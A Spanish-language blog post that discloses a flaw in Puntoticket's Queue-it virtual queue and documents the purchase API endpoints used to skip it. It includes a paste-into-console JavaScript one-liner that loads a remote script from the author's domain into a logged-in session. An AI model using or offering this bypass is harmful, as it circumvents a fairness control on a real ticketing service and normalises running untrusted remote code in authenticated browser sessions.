---
title: "Mala Queue: Vulnerabilidades de la fila virtual de Puntoticket"
date: 2022-02-22
tags:
  - chile
  - spanish
  - security
layout: layouts/post.njk
---

# Aviso

Intenté contactar a Puntoticket hace algunos días, pero no recibí ninguna respuesta. La información contenida en este post tiene solo fines educativos y ha sido recolectada utilizando información de público acceso.

El código fuente se puede encontrar [aquí](https://github.com/juancri/Puntoticket-vulnerabilidad-fila-virtual) y es provisto sin ningún tipo de garantía bajo los términos de la [licencia MIT](https://es.wikipedia.org/wiki/Licencia_MIT). Usa bajo tu propio riesgo.

Por el momento, el código filra las localidades que no tienen asientos numerados. La compra de asientos numerados requiere más investigación.

# Guía rápida

Si no tienes tiempo para leer el post completo, estos son los pasos a seguir para poder saltarse la fila virtual de Puntoticket y comprar entradas para el segundo concierto de Bad Bunny en Chile, probado en Google Chrome 98

## Video

<iframe width="560" height="315" src="https://www.youtube.com/embed/88mqWIVUv8U" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>

## Pasos

1. Copia el siguiente código en el portapapeles

```javascript
(function(d){const s=d.createElement("script");s.src="//juancri.com/malaqueue/run.min.js";d.head.appendChild(s)})(document)
```

2. Ingresa a <a href="https://www.puntoticket.com/" target="_blank">puntoticket.com</a> con tu RUT y contraseña
3. En la pestaña donde tengas abierto Puntoticket, presiona la techa **F12** o haz click derecho y selecciona la opción *"Inspect"* o *"Inspeccionar elemento"*
4. Selecciona la pestaña *"Console"* o *"Consola"*
5. Pega el código en la ventana
6. Sigue las instrucciones en pantalla

# Introducción

En el mundo físico, es relativamente sencillo manejar la demanda cuando la oferta es limitada. Algunos sistemas que se han utilizado históricamente son filas, números, horarios especiales o sorteos.

Las ventas por Internet no están ajenas a estos peaks de demanda. Eventos como el ["Ciber Lunes"](https://rpp.pe/tecnologia/mas-tecnologia/colapsan-sitios-web-de-tiendas-chilenas-en-primer-ciber-lunes-noticia-426519) ponen a prueba los sistemas de los e-commerce que deben manejar una avalancha de tráfico que no están acostumbrados a recibir.

Tecnologías como "la nube" permiten a los vendedores acceder a capacidad elástica por la cual pueden pagar durante sólo días u horas. Incluso la pandemia de COVID-19 ha sido desafiante para entidades como el ministerio de salud que tuvo que [contratar servicios en la nube](https://www.minsal.cl/autoridades-de-salud-informan-que-hay-mas-de-3-900-trazadores-de-covid-19-en-el-pais/) para poder manejar la demanda de acceso al sistema de trazabilidad epidemiológica "epivigila".

Puntoticket es uno de los sistemas de venta de entradas más populares en Chile. Hace más de 10 años, Puntoticket vio cómo [su sistema colapsaba ante la avalancha de hinchas de la Universidad de Chile](https://www.soychile.cl/Santiago/Deportes/2012/06/26/101125/Final-del-Apertura-hinchas-azules-colapsaron-sitio-de-PuntoTicket-para-comprar-entradas.aspx) que intentaban conseguir tickets para partidos como la final de la Copa Sudamericana o el campeonato nacional.

# Implementación de fila virtual

Para poder manejar estos peaks de demanda, las ticketeras -incluída Puntoticket- implementaros [sistemas de colas](https://www.latercera.com/piensa-digital/noticia/fila-virtual-y-aleatoria-como-funciona-la-venta-de-tickets-online-en-chile/K2UGECGW6ZGSBEZZ7RONTXQQYE/). En el caso de Puntoticket, la implementación de su fila virtual utiliza [Queue-it](https://queue-it.com/).

En vez de ingresar directamente a la página del evento, los compradores son desviados a una sala de espera que se habilita algunos minutos antes del inicio de la venta de tickets. Al comenzar la venta, a cada persona que está en la sala de espera se le asigna un número aleatorio. El sistema, luego, dejará ingresar a los compradores ordenados por ese número asignado y les permitirá comprar sus tickets durante algunos minutos.

Además de esta restricción, el sistema permite a cada usuario comprar un máximo de dos entradas.

# Bad Bunny

El pasado viernes 18 de febrero, [se pusieron a la venta las entradas para un concierto de Bad Bunny en el Estadio Nacional](https://www.latercera.com/culto/2022/01/24/bad-bunny-la-mayor-estrella-del-ultimo-tiempo-viene-al-estadio-nacional/). Debido a la alta demanda, se utilizó el sistema de fila virtual. Las entrada [se agotaron en menos de dos horas](https://www.latercera.com/culto/2022/02/18/bad-bunny-agota-en-dos-horas-todas-las-entradas-para-su-concierto-en-el-estadio-nacional/).

Durante este proceso de venta, realicé un análsis de seguridad del sistema de colas. Obviamente, se me asignó un número altísimo (superior a 500.000), así es que analicé el flujo de datos utilizando otros eventos que no tenían el sistema de fila virtual activado e intenté modificarlo para comprar entradas para el concierto de Bad Bunny.

# Análisis del proceso de compra

Analicé el flujo de requerimientos al realizar una compra en Puntoticket.

Cabe destacar que sólo analicé la compra de tickets no numerados. Al parecer, la compra de tickets numerados tiene un flujo un poco más largo que incluye obtener la disponibilidad del sector y especificar los asientos seleccionados.

## Términos y estructura de datos

De los requests, se pueden desprender los siguientes términos y estructuras:

- **Evento ID:** Cada evento tiene un identificador único. El formato parece ser una abreviación del organizador concatenado a un número serial. Viendo el código HTML de la [página del evento](https://www.puntoticket.com/bad-bunny) ([versión archivada](https://web.archive.org/web/20220218153330/https://www.puntoticket.com/bad-bunny)), podemos ver que el código es `'biz175'`, siendo *biz* una abreviación de Bizarro, la productora del evento, y *175* un número que parece ser serial.
- **Evento Calendario ID:** Parece ser un indicador de la fecha dentro del evento. Si un evento tiene dos fechas, los valores válidos para este parámetro serían `1` o `2`.
- **Tipo Ticket ID:** Cada ubicación dentro del recinto tendrá un tipo ticket ID. Por ejemplo, en el caso del concierto de Bad Bunny, los valores de este parámetro van desde `1` al `13`, siendo por ejemplo, `1` *'LA PLAYA'* y `11`, *'GALERIA'*.
- **Categoria Ticket ID:** No estoy seguro de qué significa. En nuestro caso, parece ser siempre `1`.

## Requests

Cuando se intenta comprar entradas para un evento, el navegador realiza dos requests importantes para el fujo.

### Pre-requisitos

Para poder ejecutar estos requests, el usuario debe estar previamente autenticado en el sitio [puntoticket.com](https://www.puntoticket.com).

### `TraerTipoTicketsSectores`

Si revisamos el tráfico, veremos que el primero es para consultar la disponibilidad de entradas por cada sector (o *tipo ticket ID*):

- **URI:** https://www.puntoticket.com/Compra/TraerTipoTicketsSectores
- **Entrada:**
  - **eventoID:** Identificador del evento. En nuestro caso, `'biz175'`.
  - **eventoCalendarioID:** Identificador de fecha del evento. En nuestro caso, `1`. Cuando se abra la segunda fecha, el valor debería ser `2`.
- **Salida:** Una lista de sectores (ignorada por ahora ya que parece estar relacionada con la venta de asientos numerados) y una lista de items -`"TipoTickets"`- que incluyen los siguientes datos:
  - **TipoTicketID:** Tipo ticket ID. En nuestro caso, un número del 1 al 13.
  - **TipoTicket:** Tipo ticket. Es el nombre del sector. Por ejemplo, `'CANCHA SAFAERA'`.
  - **Precio:** El precio en formato texto. Por ejemplo, `'$ 51.750'`.
  - **PrecioNumerico:** Al parecer, siempre es `0`.
  - **Disponible:** Un número que indica si hay entradas disponibles. `1` si hay disponibles; `0` si no hay.

Este es un ejemplo de la salida como una tabla:

|TipoTicketID |TipoTicket               |Precio    |PrecioNumerico |Disponible
|-------------|-------------------------|----------|---------------|----------
|1            |LA PLAYA                 |$ 287.500 |0              |0
|2            |DAKITI                   |$ 172.500 |0              |0
|3            |YONAGUNI	                |$ 115.000 |0              |0
|4            |PACIFICO MEDIO           |$ 97.750  |0              |0
|5            |AMORFODA                 |$ 92.000  |0              |0
|6            |PACIFICO ALTO            |$ 80.500  |0              |0
|7            |PACIFICO BAJO            |$ 69.000  |0              |0
|8            |ANDES                    |$ 63.250  |0              |0
|9            |PACIFICO LATERAL         |$ 51.750  |0              |0
|10           |CANCHA SAFAERA           |$ 51.750  |0              |0
|11           |GALERIA                  |$ 46.000  |0              |0
|12           |SILLA DE RUEDAS          |$ 46.000  |0              |0
|13           |ACOMP. SILLA DE RUEDAS   |$ 46.000  |0              |0

Podemos ver en este caso que no hay disponibilidad de ninguna ubicación. [Aquí](https://gist.github.com/juancri/29740a7f48c894f71a12624cc96f6904) puedes ver un ejemplo de la salida completa en formato JSON obtenida unos minutos antes de que se agotaran las entradas. En ese ejemplo, hay disponibilidad de entradas en galería:

```json
{
  "TipoTicketID": 11,
  "TipoTicket": "GALERIA",
  "Precio": "$ 46.000",
  "PrecioNumerico": 0,
  "Disponible": 1
}
```

### `AgregarMultipleTickets`

Este segundo request se encarga de agregar los asientos al carro de compras:

- **URI:** https://www.puntoticket.com/Compra/AgregarMultipleTickets
- **Entrada:**
  - **EventoID:** En nuestro caso, `'biz175'`
  - **EventoCalendarioID**: En nuestro caso `1`. Cuando se abra la segunda fecha, este parámetro debería tener valor `2`.
  - **CategoriaTicketID:**
  - **Tickets (listado):**
    - **TipoTicketID:** Obtenido desde el resultado anterior
    - **Cantidad:** Cantidad de tickets (en el caso de este evento, limitado a 2)
- **Salida:** Un objeto JSON que incluye las siguientes propiedades
  - **Success:** Boolean. `true` cuando la operación ha sido exitosa; `false` cuando ha fallado.
  - **Message:** Mensaje en HTML sobre el resultado
  - **ErrorList:** `null` cuando la operación ha sido exitosa. Array de mensajes de error cuando ha fallado.

### Fin del proceso de compra

Una vez agregados los tickets al carro de compras, el usuario puede completar el proceso de pago ingresando a la URI [https://www.puntoticket.com/Compra/Pago](https://www.puntoticket.com/Compra/Pago).

## Diagrama

Este es un diagrama simplificado de los pasos comunes mínimos para completar la compra:

![diagrama](/img/process.jpg)

Los procesos de autenticación y pago se realizan en la web normalmente. Los requests a `TraerTipoTicketsSectores` y `AgregarMultipleTickets` se pueden realizar utilizando `fetch` o XHR (lo que antiguamente se conocía como AJAX).

La llamada a `TraerTipoTicketsSectores` no es estrictamente necesaria si ya sabemos los códigos de los sectores y la disponibilidad.

# Vulnerabilidades

La vulnerabilidad principal de la implementación de Puntoticket es que el request para agregar asientos al carro de compras no realiza ninguna verificación sobre el origen del request para verificar que, en caso de ser necesario, el usuario ha realizado la fila y ya es su turno.

Probablemente, esta verificación existe, pero en un solo lugar que es la página de entrada al evento. Podría ser un caso de [seguridad por oscuridad](https://es.wikipedia.org/wiki/Seguridad_por_oscuridad) donde se confía que nadie va a investigar cómo funciona el sistema y por lo tanto, no se le agrega seguridad.

Existen varias formas de agregar esta verificación, aunque últimamente dependerá de la API que provea Queue-it.

# Explotación de la vulnerabilidad

Al exitir esta vulnerabilidad, es posible utilizar cURL, HTTPie o cualquier cliente HTTP, inclído `fetch` en el navegador, que permita crear el request HTTP para llamar al endpoint `AgregarMultipleTickets` con los parámetros adecuados. Una vez realizado este paso, un usuario podría digirse directamente al proceso de pago.

El código completo está disponible en el repostorio [juancri/mala-queue](https://github.com/juancri/mala-queue).
